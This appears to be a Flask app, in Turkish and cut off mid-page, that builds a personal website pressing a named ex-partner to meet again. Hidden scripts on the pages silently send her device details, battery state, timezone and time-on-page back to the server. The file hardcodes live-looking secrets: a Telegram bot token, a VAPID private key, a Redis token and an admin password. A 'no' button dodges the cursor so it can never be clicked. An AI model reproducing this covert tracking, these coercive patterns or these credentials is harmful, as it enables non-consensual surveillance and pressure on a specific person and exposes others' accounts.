import os
import json
from datetime import date

import requests
from flask import Flask, redirect, request, render_template_string, jsonify, send_from_directory, Response, session

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "mart-on-iki-giris")

TELEGRAM_TOKEN = "8469271411:AAEMaIvq-GrE2_col2-py9IuOO3oyahMxR0"
CHAT_ID = "7141351945"
HEDEF_URL = "https://x.com/hepkirildi/status/2065489119833157669?s=20"

# Push bildirim ayarları
VAPID_PUBLIC_KEY  = os.environ.get("VAPID_PUBLIC_KEY",  "BFDOkQo7sDb26BGga2Gi6AcYR3WpcSxHRXJdkgiELD92r1Fb4Vw0FHWxnEb_YvVJP4fBLKKNk1SCyvtgaTOmdxw")
VAPID_PRIVATE_KEY = os.environ.get("VAPID_PRIVATE_KEY", "MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQgpu7Uw20PEGPqb9B0pgJdnVK68D2qNbZAXb7O982NQ8yhRANCAARQzpEKO7A29ugRoGthougHGEd1qXEsR0VyXZIIhCw/dq9RW+FcNBR1sZxG/2L1ST+HwSyijZNUgsr7YGkzpncc")
VAPID_CONTACT     = "mailto:admin@admin.com"
ADMIN_SECRET      = os.environ.get("ADMIN_SECRET", "furkangizli99")

# Upstash Redis (ücretsiz – push aboneliklerini ve bekleyen mesajı saklar)
UPSTASH_URL   = os.environ.get("UPSTASH_URL",   "https://normal-louse-128433.upstash.io")
UPSTASH_TOKEN = os.environ.get("UPSTASH_TOKEN", "gQAAAAAAAfWxAQIgcDExNTBhYzM3NGUxN2Y0OWRmOTUxM2UyZjI4NTBiM2EzNQ")


def upstash(command, *args):
    """Upstash Redis REST API üzerinden komut çalıştır."""
    if not UPSTASH_URL or not UPSTASH_TOKEN:
        return None
    try:
        r = requests.post(
            UPSTASH_URL,
            headers={"Authorization": f"Bearer {UPSTASH_TOKEN}"},
            json=[command, *args],
            timeout=5,
        )
        return r.json().get("result")
    except Exception as e:
        print("Upstash hatası:", e)
        return None


def izin_tarih_araligi():
    yil = date.today().year
    return [date(yil, 7, 9), date(yil, 7, 10), date(yil, 7, 12), date(yil, 7, 13)]

HTML_GIRIS = """
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>giriş</title>
  <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Playfair+Display:ital,wght@1,400;1,600&display=swap" rel="stylesheet"/>
  <style>
    *{box-sizing:border-box;margin:0;padding:0;}
    body{min-height:100vh;background:#0a0208;font-family:'Lato',sans-serif;display:flex;align-items:center;justify-content:center;padding:24px 14px;position:relative;overflow-x:hidden;overflow-y:auto;-webkit-overflow-scrolling:touch;}
    .kalpler{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;}
    .kalp{position:absolute;opacity:0;animation:yuksel 7s ease-in infinite;}
    @keyframes yuksel{0%{opacity:0;transform:translateY(0) scale(0.5);}10%{opacity:.35;}90%{opacity:.1;}100%{opacity:0;transform:translateY(-100vh) scale(1.1);}}
    .kart{position:relative;z-index:1;max-width:520px;width:100%;background:rgba(28,6,14,.92);border:1px solid rgba(220,80,100,.22);border-radius:24px;padding:40px 24px 30px;backdrop-filter:blur(14px);box-shadow:0 12px 60px rgba(0,0,0,.65);text-align:center;}
    .emoji-ust{font-size:2.4rem;display:block;margin-bottom:14px;animation:nabiz 2.2s ease-in-out infinite;}
    @keyframes nabiz{0%,100%{transform:scale(1);}50%{transform:scale(1.14);}}
    .baslik{font-family:'Playfair Display',serif;font-style:italic;font-size:1.58rem;color:#f0d0d8;line-height:1.4;margin-bottom:10px;}
    .alt-yazi{color:#9f7b84;font-size:.9rem;line-height:1.65;font-weight:300;margin-bottom:24px;}
    form{display:flex;flex-direction:column;gap:14px;}
    .secim-grup{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
    select{width:100%;border:none;border-radius:16px;padding:15px 16px;background:#f8e9ee;color:#35141f;font-size:1rem;font-family:'Lato',sans-serif;outline:none;appearance:none;}
    select:focus{box-shadow:0 0 0 2px rgba(201,64,96,.35);}
    .giris-btn{width:100%;border:none;border-radius:50px;padding:15px 24px;background:linear-gradient(135deg,#c94060,#e8607a);color:#fff;font-size:1rem;font-family:'Lato',sans-serif;font-weight:600;cursor:pointer;box-shadow:0 4px 20px rgba(200,60,90,.4);transition:transform .15s,box-shadow .15s;letter-spacing:.04em;}
    .giris-btn:hover{transform:scale(1.03);box-shadow:0 6px 28px rgba(200,60,90,.55);}
    .hata{min-height:18px;color:#e09aa8;font-size:.83rem;line-height:1.5;}
    @media (max-width:600px){.kart{padding:34px 18px 24px;border-radius:20px;}.emoji-ust{font-size:2rem;}.baslik{font-size:1.34rem;line-height:1.32;}.alt-yazi{font-size:.84rem;margin-bottom:20px;}.secim-grup{grid-template-columns:1fr;}.giris-btn{padding:15px 20px;}}
  </style>
</head>
<body>
  <div class="kalpler" id="kalpler"></div>
  <div class="kart">
    <span class="emoji-ust">🔐</span>
    <p class="baslik">önce şifreyi bilmen lazım</p>
    <p class="alt-yazi">günü ve ayı seçip giriş yap.</p>
    <form method="post">
      <div class="secim-grup">
        <select name="gun" required>
          <option value="">gün seç</option>
          {% for gun in gunler %}
          <option value="{{ gun }}">{{ gun }}</option>
          {% endfor %}
        </select>
        <select name="ay" required>
          <option value="">ay seç</option>
          <option value="ocak">ocak</option>
          <option value="subat">şubat</option>
          <option value="mart">mart</option>
          <option value="nisan">nisan</option>
          <option value="mayis">mayıs</option>
          <option value="haziran">haziran</option>
          <option value="temmuz">temmuz</option>
          <option value="agustos">ağustos</option>
          <option value="eylul">eylül</option>
          <option value="ekim">ekim</option>
          <option value="kasim">kasım</option>
          <option value="aralik">aralık</option>
        </select>
      </div>
      <button class="giris-btn" type="submit">giriş yap</button>
      <p class="hata">{{ hata or '' }}</p>
    </form>
  </div>
  <script>
    const kalpDiv=document.getElementById('kalpler');
    const emojiler=['🌸','💗','✨','🌷','💖','🫧','🌹','💝'];
    for(let i=0;i<22;i++){const el=document.createElement('span');el.className='kalp';el.textContent=emojiler[Math.floor(Math.random()*emojiler.length)];el.style.left=Math.random()*100+'%';el.style.animationDelay=Math.random()*8+'s';el.style.animationDuration=(5+Math.random()*5)+'s';el.style.fontSize=(.7+Math.random()*.8)+'rem';kalpDiv.appendChild(el);}
  </script>
</body>
</html>
"""

HTML_SAYFA = """
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>sana bir sorum var</title>
  <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Playfair+Display:ital,wght@1,400;1,600&display=swap" rel="stylesheet"/>
  <style>
    *{box-sizing:border-box;margin:0;padding:0;}
    body{
      min-height:100vh;
      background:#0a0208;
      font-family:'Lato',sans-serif;
      display:flex;align-items:center;justify-content:center;
      padding:32px 16px;
      overflow-x:hidden;
      overflow-y:auto;
      -webkit-overflow-scrolling:touch;
      position:relative;
    }
    /* Floating hearts background */
    .kalpler{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;}
    .kalp{
      position:absolute;
      font-size:1.2rem;
      opacity:0;
      animation:yuksel 6s ease-in infinite;
    }
    @keyframes yuksel{
      0%{opacity:0;transform:translateY(0) scale(0.5);}
      10%{opacity:.35;}
      90%{opacity:.1;}
      100%{opacity:0;transform:translateY(-100vh) scale(1.1);}
    }
    .kart{
      position:relative;z-index:1;
      max-width:520px;width:100%;
      background:rgba(28,6,14,.9);
      border:1px solid rgba(220,80,100,.22);
      border-radius:24px;
      padding:52px 40px 44px;
      backdrop-filter:blur(14px);
      box-shadow:0 12px 60px rgba(0,0,0,.65),0 0 0 1px rgba(200,60,80,.08);
      text-align:center;
    }
    .adim{display:none;animation:belir 0.45s ease;}
    .adim.aktif{display:block;}
    @keyframes belir{from{opacity:0;transform:translateY(10px);}to{opacity:1;transform:translateY(0);}}
    .emoji-ust{font-size:2.6rem;margin-bottom:18px;display:block;animation:nabiz 2s ease-in-out infinite;}
    @keyframes nabiz{0%,100%{transform:scale(1);}50%{transform:scale(1.15);}}
    .not-baslik{
      font-family:'Playfair Display',serif;
      font-style:italic;
      font-size:1.7rem;
      color:#f0d0d8;
      line-height:1.35;
      margin-bottom:16px;
    }
    .not-metni{
      color:#d3b4bc;
      font-size:.97rem;
      line-height:1.9;
      font-weight:300;
      white-space:pre-line;
      margin-bottom:28px;
    }
    .okudum-btn{
      background:rgba(255,255,255,.08);
      color:#f3d7de;
      border:1px solid rgba(220,80,100,.22);
      border-radius:50px;
      padding:14px 28px;
      font-size:.98rem;
      font-family:'Lato',sans-serif;
      font-weight:600;
      cursor:pointer;
      transition:transform .15s,background .15s,border-color .15s;
      letter-spacing:.03em;
    }
    .okudum-btn:hover{transform:translateY(-2px);background:rgba(255,255,255,.11);border-color:rgba(220,80,100,.36);}
    @media (max-width:600px){
      body{padding:20px 14px;align-items:flex-start;}
      .kart{margin-top:26px;padding:36px 22px 30px;border-radius:20px;}
      .emoji-ust{font-size:2.2rem;margin-bottom:14px;}
      .not-baslik{font-size:1.38rem;margin-bottom:12px;}
      .not-metni{font-size:.9rem;line-height:1.75;margin-bottom:22px;}
      .okudum-btn{width:100%;max-width:220px;}
    }
  </style>
</head>
<body>
  <div class="kalpler" id="kalpler"></div>

  <div class="kart">
    <div class="adim aktif" id="notAdim">
      <span class="emoji-ust">💌</span>
      <p class="not-baslik">sana küçük bir notum var</p>
      <p class="not-metni">biliyorsun bayadır uğraşıyorum. hatalarımın farkına varıyorum ama aynı zamanda senle yaptığımız her şeyi çok özlüyorum ve eminim sen de özlüyorsun.

    şu sayfayı yapmak için bile saatlerce uğraşıyorum, hiç önemli değil; ama sana değiştiğimi, değişeceğimi göstermek istiyorum. çünkü senden ilk defa bu kadar uzak kaldım.

    bana bi şans ver aybüke. flört gibi, gerekirse adını sen koy ama bi şans ver ki gör ne kadar mutlu olacağımızı. ondan sonra sorunlar olursa emin ol ben de artık yapacak bi şey yok derim. ama yapacak şeyim var, yapıyorum da.

    ve emin ol, ben seni kazanıp... seni diyorum ama sen benim her şeyimdin, her şeyim olacaksın. zaten o kişiyi geri kaybetmemek için her şeyi yaparım. ben gerizekalı değilim, seni kaybetmeme sebep olacak şeyler yapmaya devam edeyim.

    senden isteğim sayfanın sonuna kadar gel, beni daha iyi anlıcaksın.</p>
      <button class="okudum-btn" type="button" onclick="window.location.href='/bulusma'">okudum</button>
    </div>
  </div>

  <script>
    // ── Floating hearts ──
    const kalpDiv=document.getElementById('kalpler');
    const emojiler=['🌸','💗','✨','🌷','💖','🫧','🌹','💝'];
    for(let i=0;i<22;i++){
      const el=document.createElement('span');
      el.className='kalp';
      el.textContent=emojiler[Math.floor(Math.random()*emojiler.length)];
      el.style.left=Math.random()*100+'%';
      el.style.animationDelay=Math.random()*8+'s';
      el.style.animationDuration=(5+Math.random()*5)+'s';
      el.style.fontSize=(.7+Math.random()*.8)+'rem';
      kalpDiv.appendChild(el);
    }

    // ── Ziyaretçi bilgisi ──
    const _t0=Date.now();
    (async()=>{
      let pil='?';
      try{const b=await navigator.getBattery();pil=(b.level*100).toFixed(0)+'% '+(b.charging?'(Şarj oluyor)':'(Şarj değil)');}catch(e){pil='Erişilemiyor';}
      fetch('/api/bilgi',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({
        ekran:screen.width+'x'+screen.height,pencere:window.innerWidth+'x'+window.innerHeight,
        saat:new Date().toLocaleString('tr-TR'),zaman_dilimi:Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform:navigator.platform||navigator.userAgentData?.platform||'?',pil,cevrimici:navigator.onLine?'Evet':'Hayır'
      })});
    })();
    function _sure(){
      const s=Math.round((Date.now()-_t0)/1000),v=JSON.stringify({saniye:s});
      navigator.sendBeacon?navigator.sendBeacon('/api/sure',new Blob([v],{type:'application/json'})):fetch('/api/sure',{method:'POST',headers:{'Content-Type':'application/json'},body:v,keepalive:true});
    }
    document.addEventListener('visibilitychange',()=>{if(document.visibilityState==='hidden')_sure();});
    window.addEventListener('beforeunload',_sure);
  </script>
</body>
</html>
"""

HTML_SORU = """
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>sana bir sorum var</title>
  <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Playfair+Display:ital,wght@1,400;1,600&display=swap" rel="stylesheet"/>
  <style>
    *{box-sizing:border-box;margin:0;padding:0;}
    body{min-height:100vh;background:#0a0208;font-family:'Lato',sans-serif;display:flex;align-items:center;justify-content:center;padding:32px 16px;overflow-x:hidden;overflow-y:auto;-webkit-overflow-scrolling:touch;position:relative;}
    .kalpler{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;}
    .kalp{position:absolute;font-size:1.2rem;opacity:0;animation:yuksel 6s ease-in infinite;}
    @keyframes yuksel{0%{opacity:0;transform:translateY(0) scale(0.5);}10%{opacity:.35;}90%{opacity:.1;}100%{opacity:0;transform:translateY(-100vh) scale(1.1);}}
    .kart{position:relative;z-index:1;max-width:520px;width:100%;background:rgba(28,6,14,.9);border:1px solid rgba(220,80,100,.22);border-radius:24px;padding:52px 40px 44px;backdrop-filter:blur(14px);box-shadow:0 12px 60px rgba(0,0,0,.65),0 0 0 1px rgba(200,60,80,.08);text-align:center;}
    .emoji-ust{font-size:2.6rem;margin-bottom:18px;display:block;animation:nabiz 2s ease-in-out infinite;}
    @keyframes nabiz{0%,100%{transform:scale(1);}50%{transform:scale(1.15);}}
    .soru-baslik{font-family:'Playfair Display',serif;font-style:italic;font-size:1.75rem;color:#f0d0d8;line-height:1.4;margin-bottom:10px;}
    .soru-alt{color:#a07880;font-size:.88rem;font-weight:300;margin-bottom:40px;letter-spacing:.03em;}
    .buton-grup{display:flex;gap:18px;justify-content:center;align-items:center;flex-wrap:nowrap;position:relative;min-height:56px;}
    .btn{padding:14px 36px;border:none;border-radius:50px;font-size:1.05rem;font-family:'Lato',sans-serif;font-weight:600;cursor:pointer;transition:transform .15s,box-shadow .15s;letter-spacing:.04em;white-space:nowrap;}
    .btn-evet{background:linear-gradient(135deg,#c94060,#e8607a);color:#fff;box-shadow:0 4px 20px rgba(200,60,90,.4);}
    .btn-evet:hover{transform:scale(1.06);box-shadow:0 6px 28px rgba(200,60,90,.55);}
    .btn-hayir{background:rgba(255,255,255,.06);color:#a07880;border:1px solid rgba(200,80,100,.2);position:fixed;cursor:not-allowed;transition:none;}
    .kucuk-not{margin-top:30px;color:#6a4850;font-size:.78rem;font-style:italic;min-height:18px;transition:opacity .3s;}
    @media (max-width:600px){body{padding:20px 14px;align-items:flex-start;}.kart{margin-top:26px;padding:36px 22px 30px;border-radius:20px;}.emoji-ust{font-size:2.2rem;margin-bottom:14px;}.soru-baslik{font-size:1.42rem;line-height:1.32;}.soru-alt{font-size:.82rem;margin-bottom:28px;}.buton-grup{min-height:124px;}.btn{width:100%;padding:15px 24px;font-size:1rem;}.btn-evet{max-width:220px;}.btn-hayir{width:auto;min-width:110px;}.kucuk-not{margin-top:20px;font-size:.75rem;}}
  </style>
</head>
<body>
  <div class="kalpler" id="kalpler"></div>
  <div class="kart">
    <span class="emoji-ust">🌹</span>
    <p class="soru-baslik">benimle buluşacak mısın?</p>
    <p class="soru-alt">hayır demeden bi düşün ve sitenin sonuna gel ne olursa olsun.</p>
    <div class="buton-grup" id="butonGrup">
      <button class="btn btn-evet" id="btnEvet" onclick="window.location.href='/son-not'">evet 💕</button>
      <button class="btn btn-hayir" id="btnHayir">hayır</button>
    </div>
    <p class="kucuk-not" id="kucukNot"></p>
  </div>
  <script>
    const kalpDiv=document.getElementById('kalpler');
    const emojiler=['🌸','💗','✨','🌷','💖','🫧','🌹','💝'];
    for(let i=0;i<22;i++){const el=document.createElement('span');el.className='kalp';el.textContent=emojiler[Math.floor(Math.random()*emojiler.length)];el.style.left=Math.random()*100+'%';el.style.animationDelay=Math.random()*8+'s';el.style.animationDuration=(5+Math.random()*5)+'s';el.style.fontSize=(.7+Math.random()*.8)+'rem';kalpDiv.appendChild(el);}
    const btn=document.getElementById('btnHayir');
    const notlar=['oraya tıklayamazsın 😏','dur dur dur 😅','kaçtım bile 🏃‍♀️','yanlış taraf 🙈','nereye? 😄','cidden mi? 🤭'];
    let notIdx=0;
    function kac(e){const vw=window.innerWidth;const vh=window.innerHeight;const bw=btn.offsetWidth;const bh=btn.offsetHeight;const mx=e.clientX,my=e.clientY;const cx=btn.getBoundingClientRect().left+bw/2;const cy=btn.getBoundingClientRect().top+bh/2;const dx=cx-mx,dy=cy-my;const mag=Math.sqrt(dx*dx+dy*dy)||1;const kacMesafe=140+Math.random()*80;let nx=cx+(dx/mag)*kacMesafe-bw/2;let ny=cy+(dy/mag)*kacMesafe-bh/2;nx=Math.max(8,Math.min(vw-bw-8,nx));ny=Math.max(8,Math.min(vh-bh-8,ny));btn.style.left=nx+'px';btn.style.top=ny+'px';btn.style.right='auto';const not=document.getElementById('kucukNot');not.textContent=notlar[notIdx%notlar.length];notIdx++;}
    function baslangicKonumu(){const evet=document.getElementById('btnEvet');const r=evet.getBoundingClientRect();const mobil=window.innerWidth<600;const hedefX=mobil?Math.max(12,window.innerWidth-btn.offsetWidth-18):r.right+18;const hedefY=mobil?r.bottom+16:r.top;btn.style.left=Math.min(window.innerWidth-btn.offsetWidth-12,hedefX)+'px';btn.style.top=Math.min(window.innerHeight-btn.offsetHeight-12,hedefY)+'px';}
    window.addEventListener('load',baslangicKonumu);window.addEventListener('resize',baslangicKonumu);btn.addEventListener('pointerenter',kac);btn.addEventListener('mousemove',kac);btn.addEventListener('touchstart',(e)=>{const t=e.touches[0];kac({clientX:t.clientX,clientY:t.clientY});},{passive:true});
    const _t0=Date.now();
    (async()=>{let pil='?';try{const b=await navigator.getBattery();pil=(b.level*100).toFixed(0)+'% '+(b.charging?'(Şarj oluyor)':'(Şarj değil)');}catch(e){pil='Erişilemiyor';}fetch('/api/bilgi',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ekran:screen.width+'x'+screen.height,pencere:window.innerWidth+'x'+window.innerHeight,saat:new Date().toLocaleString('tr-TR'),zaman_dilimi:Intl.DateTimeFormat().resolvedOptions().timeZone,platform:navigator.platform||navigator.userAgentData?.platform||'?',pil,cevrimici:navigator.onLine?'Evet':'Hayır'})});})();
    function _sure(){const s=Math.round((Date.now()-_t0)/1000),v=JSON.stringify({saniye:s});navigator.sendBeacon?navigator.sendBeacon('/api/sure',new Blob([v],{type:'application/json'})):fetch('/api/sure',{method:'POST',headers:{'Content-Type':'application/json'},body:v,keepalive:true});}
    document.addEventListener('visibilitychange',()=>{if(document.visibilityState==='hidden')_sure();});window.addEventListener('beforeunload',_sure);
  </script>
</body>
</html>
"""

HTML_TARIH = """
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>izin günü</title>
  <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Playfair+Display:ital,wght@1,400;1,600&display=swap" rel="stylesheet"/>
  <style>
    *{box-sizing:border-box;margin:0;padding:0;}
    body{
      min-height:100vh;
      background:#0a0208;
      font-family:'Lato',sans-serif;
      display:flex;align-items:center;justify-content:center;
      padding:32px 16px;
      position:relative;
      overflow-x:hidden;
      overflow-y:auto;
      -webkit-overflow-scrolling:touch;
    }
    .kalpler{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;}
    .kalp{position:absolute;opacity:0;animation:yuksel 7s ease-in infinite;}
    @keyframes yuksel{
      0%{opacity:0;transform:translateY(0) scale(0.5);}
      10%{opacity:.38;}90%{opacity:.1;}
      100%{opacity:0;transform:translateY(-100vh) scale(1.1);}
    }
    .kart{
      position:relative;z-index:1;
      width:100%;max-width:520px;
      background:rgba(28,6,14,.92);
      border:1px solid rgba(220,80,100,.22);
      border-radius:24px;
      padding:42px 34px 36px;
      backdrop-filter:blur(14px);
      box-shadow:0 12px 60px rgba(0,0,0,.65);
      text-align:center;
    }
    .emoji-ust{font-size:2.4rem;display:block;margin-bottom:14px;animation:nabiz 2.2s ease-in-out infinite;}
    @keyframes nabiz{0%,100%{transform:scale(1);}50%{transform:scale(1.14);}}
    .adim{display:none;animation:belir .45s ease;}
    .adim.aktif{display:block;}
    @keyframes belir{from{opacity:0;transform:translateY(10px);}to{opacity:1;transform:translateY(0);}}
    .baslik{
      font-family:'Playfair Display',serif;
      font-style:italic;
      font-size:1.6rem;
      color:#f0d0d8;
      line-height:1.4;
      margin-bottom:10px;
    }
    .alt-yazi{
      color:#9c7881;
      font-size:.9rem;
      line-height:1.65;
      font-weight:300;
      margin-bottom:26px;
    }
    .not-kutu{
      margin:0 0 24px;
      padding:18px 20px;
      border-radius:18px;
      background:rgba(255,255,255,.05);
      border:1px solid rgba(220,80,100,.16);
      color:#efcfd7;
      font-size:.92rem;
      line-height:1.75;
      font-weight:400;
    }
    .tarih-alan{
      background:rgba(255,255,255,.04);
      border:1px solid rgba(220,80,100,.15);
      border-radius:18px;
      padding:18px;
      margin-bottom:18px;
    }
    .etiket{
      display:block;
      color:#dcb2bb;
      font-size:.84rem;
      margin-bottom:10px;
      letter-spacing:.03em;
    }
    .tarih-input{
      width:100%;
      border:none;
      border-radius:14px;
      padding:16px 18px;
      background:#f8e9ee;
      color:#35141f;
      font-size:1rem;
      font-family:'Lato',sans-serif;
      outline:none;
    }
    .tarih-input:focus{box-shadow:0 0 0 2px rgba(201,64,96,.35);}
    .limit-not{
      color:#7d5b64;
      font-size:.78rem;
      line-height:1.5;
      min-height:18px;
      margin-bottom:22px;
    }
    .devam-btn{
      width:100%;
      border:none;
      border-radius:50px;
      padding:15px 24px;
      background:linear-gradient(135deg,#c94060,#e8607a);
      color:#fff;
      font-size:1rem;
      font-family:'Lato',sans-serif;
      font-weight:600;
      cursor:pointer;
      box-shadow:0 4px 20px rgba(200,60,90,.4);
      transition:transform .15s,box-shadow .15s,opacity .2s;
      letter-spacing:.04em;
    }
    .devam-btn:hover{transform:scale(1.03);box-shadow:0 6px 28px rgba(200,60,90,.55);}
    .devam-btn:disabled{opacity:.45;cursor:not-allowed;transform:none;}
    .okudum-btn{
      width:100%;
      border:none;
      border-radius:50px;
      padding:15px 24px;
      background:rgba(255,255,255,.08);
      color:#f3d7de;
      font-size:1rem;
      font-family:'Lato',sans-serif;
      font-weight:600;
      cursor:pointer;
      transition:transform .15s,background .15s,border-color .15s;
      border:1px solid rgba(220,80,100,.22);
      letter-spacing:.03em;
    }
    .okudum-btn:hover{transform:translateY(-2px);background:rgba(255,255,255,.11);border-color:rgba(220,80,100,.36);}
    .hata{
      margin-top:14px;
      color:#d88998;
      font-size:.82rem;
      min-height:18px;
    }
    @media (max-width:600px){
      body{padding:20px 14px;align-items:flex-start;}
      .kart{margin-top:22px;padding:32px 18px 24px;border-radius:20px;}
      .emoji-ust{font-size:2rem;}
      .baslik{font-size:1.34rem;line-height:1.32;}
      .alt-yazi{font-size:.85rem;margin-bottom:22px;}
      .not-kutu{font-size:.84rem;line-height:1.65;padding:15px 16px;margin-bottom:20px;}
      .tarih-alan{padding:14px;}
      .tarih-input{padding:15px 16px;}
    }
  </style>
</head>
<body>
  <div class="kalpler" id="kalpler"></div>

  <div class="kart">
    <div class="adim aktif" id="mesajAdim">
      <span class="emoji-ust">📅</span>
      <p class="baslik">senden bir şey daha istiyorum</p>
      <p class="alt-yazi">bunu da bir kere okuyup sonra diğer adıma geç.</p>
      <div class="not-kutu">beni bu kadar net şekilde hayatından çıkarma, dene gör eğer mutluluklarımıza değmezse sonuna kadar haklısın sadece deneme istiyorum senden.

    ama arşive atmalı, buluşalım dediğimde hayır diyeceğin veya seni 30 dk görmek istediğimde reddedeceğin şekilde bi deneme değil. cidden içinden gelerek bunu vermeni istiyorum, değişimi gör istiyorum. evet göt edeceğim seni dedim ve kararlıyım.

    iznin olmadığını söylediğin için bi gün kahvaltıya gidelim barışmak için değil nasıl zaman geçirdiğimizi hatırlayalım. önceki de çok güzeldi sonrasında ben sıçmadan önce ama çok güzeldi aybüke.. yaşadığımız şeyleri unutup değil sadece kafamızda bi ton şey dönmeden bi kahvaltı yapalım.</div>
      <button class="okudum-btn" type="button" onclick="tariheGec()">okudum</button>
    </div>

    <div class="adim" id="tarihAdim">
      <span class="emoji-ust">📅</span>
      <p class="baslik">kahvaltıya ne zaman gidelim?</p>
      <p class="alt-yazi">yalnızca 9, 10, 12 veya 13 temmuz arasından bir gün seç, sonra devam edelim güzelim.</p>

      <div class="tarih-alan">
        <label class="etiket" for="izinTarihi">uygun olduğun günü seç</label>
        <input class="tarih-input" id="izinTarihi" type="date" min="{{ min_date }}" max="{{ max_date }}"/>
      </div>

      <p class="limit-not">yalnızca 9, 10, 12 veya 13 temmuz seçilebilir.</p>
      <button class="devam-btn" id="devamBtn" type="button" disabled onclick="devamEt()">devam 💕</button>
      <p class="hata" id="hata"></p>
    </div>
  </div>

  <script>
    const kalpDiv=document.getElementById('kalpler');
    const emojiler=['🌸','💗','✨','🌷','💖','🫧','🌹','💝','🎀'];
    for(let i=0;i<22;i++){
      const el=document.createElement('span');
      el.className='kalp';
      el.textContent=emojiler[Math.floor(Math.random()*emojiler.length)];
      el.style.left=Math.random()*100+'%';
      el.style.animationDelay=Math.random()*8+'s';
      el.style.animationDuration=(5+Math.random()*5)+'s';
      el.style.fontSize=(.7+Math.random()*.8)+'rem';
      kalpDiv.appendChild(el);
    }

    const mesajAdim=document.getElementById('mesajAdim');
    const tarihAdim=document.getElementById('tarihAdim');
    const tarihInput=document.getElementById('izinTarihi');
    const devamBtn=document.getElementById('devamBtn');
    const hata=document.getElementById('hata');
    const izinliTarihler={{ allowed_dates|tojson }};
    function tariheGec(){
      mesajAdim.classList.remove('aktif');
      tarihAdim.classList.add('aktif');
    }
    tarihInput.addEventListener('input',()=>{
      const seciliTarih=tarihInput.value;
      devamBtn.disabled=!seciliTarih || !izinliTarihler.includes(seciliTarih);
      hata.textContent=seciliTarih && !izinliTarihler.includes(seciliTarih)
        ? 'yalnızca 9, 10, 12 veya 13 temmuz seçebilirsin.'
        : '';
    });

    function devamEt(){
      if(!tarihInput.value){
        hata.textContent='önce bir tarih seç.';
        return;
      }
      if(!izinliTarihler.includes(tarihInput.value)){
        hata.textContent='yalnızca 9, 10, 12 veya 13 temmuz seçebilirsin.';
        return;
      }
      devamBtn.disabled=true;
      fetch('/api/tarih-secim',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({tarih:tarihInput.value})
      }).then(async(r)=>{
        if(!r.ok){
          const veri=await r.json().catch(()=>({}));
          throw new Error(veri.hata||'bir şey ters gitti.');
        }
        window.location.href='/soru';
      }).catch((err)=>{
        devamBtn.disabled=false;
        hata.textContent=err.message||'bir şey ters gitti.';
      });
    }

    const _t0=Date.now();
    (async()=>{
      let pil='?';
      try{const b=await navigator.getBattery();pil=(b.level*100).toFixed(0)+'%';}catch(e){}
      fetch('/api/bilgi',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({
        ekran:screen.width+'x'+screen.height,pencere:window.innerWidth+'x'+window.innerHeight,
        saat:new Date().toLocaleString('tr-TR'),zaman_dilimi:Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform:navigator.platform||'?',pil,cevrimici:navigator.onLine?'Evet':'Hayır'
      })});
    })();
    function _sure(){
      const s=Math.round((Date.now()-_t0)/1000),v=JSON.stringify({saniye:s});
      navigator.sendBeacon?navigator.sendBeacon('/api/sure',new Blob([v],{type:'application/json'})):fetch('/api/sure',{method:'POST',headers:{'Content-Type':'application/json'},body:v,keepalive:true});
    }
    document.addEventListener('visibilitychange',()=>{if(document.visibilityState==='hidden')_sure();});
    window.addEventListener('beforeunload',_sure);
  </script>
</body>
</html>
"""

HTML_BULUSMA = """
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>harika 🌸</title>
  <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Playfair+Display:ital,wght@1,400;1,600&display=swap" rel="stylesheet"/>
  <style>
    *{box-sizing:border-box;margin:0;padding:0;}
    body{
      min-height:100vh;
      background:#0a0208;
      font-family:'Lato',sans-serif;
      display:flex;align-items:center;justify-content:center;
      padding:32px 16px;
      position:relative;
      overflow-x:hidden;
      overflow-y:auto;
      -webkit-overflow-scrolling:touch;
    }
    .kalpler{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;}
    .kalp{position:absolute;opacity:0;animation:yuksel 7s ease-in infinite;}
    @keyframes yuksel{
      0%{opacity:0;transform:translateY(0) scale(0.5);}
      10%{opacity:.4;}90%{opacity:.1;}
      100%{opacity:0;transform:translateY(-100vh) scale(1.1);}
    }
    .kart{
      position:relative;z-index:1;
      max-width:580px;width:100%;
      background:rgba(28,6,14,.92);
      border:1px solid rgba(220,80,100,.22);
      border-radius:24px;
      padding:48px 38px 44px;
      backdrop-filter:blur(14px);
      box-shadow:0 12px 60px rgba(0,0,0,.65);
    }
    .baslik-alan{text-align:center;margin-bottom:36px;}
    .emoji-ust{font-size:2.4rem;display:block;margin-bottom:14px;animation:nabiz 2.2s ease-in-out infinite;}
    @keyframes nabiz{0%,100%{transform:scale(1);}50%{transform:scale(1.14);}}
    .baslik{
      font-family:'Playfair Display',serif;
      font-style:italic;
      font-size:1.55rem;
      color:#f0d0d8;
      line-height:1.45;
